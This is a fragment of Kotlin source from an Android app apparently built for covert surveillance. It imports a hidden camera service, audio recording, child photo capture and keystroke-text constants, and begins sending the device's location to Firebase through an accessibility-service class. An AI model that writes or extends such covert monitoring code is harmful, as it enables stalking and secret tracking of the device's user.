...
import com.my.spy.app.utils.ConstFun.getRandomNumeric
import com.my.spy.app.utils.ConstFun.showApp
import com.my.spy.app.utils.Consts.ADDRESS_AUDIO_RECORD
import com.my.spy.app.utils.Consts.CHILD_CAPTURE_PHOTO
...
import com.my.spy.app.utils.Consts.KEY_TEXT
...
import com.my.spy.app.utils.FileHelper.getFileNameAudio
import com.my.spy.app.utils.FileHelper.getFilePath
import com.my.spy.app.utils.MediaRecorderUtils
import com.my.spy.app.utils.MyCountDownTimer
import com.my.spy.app.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.my.spy.app.utils.hiddenCameraServiceUtils.CameraConfig
import com.my.spy.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.my.spy.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.my.spy.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.my.spy.app.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.my.spy.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.my.spy.app.utils.hiddenCameraServiceUtils.config.CameraRotation
...
class InteractorAccessibilityData @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceAccessibility, CameraCallbacks {
    ...
    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            ...
            val model = com.my.spy.app.data.model.Location(location.latitude, location.longitude, address, getDateTime())
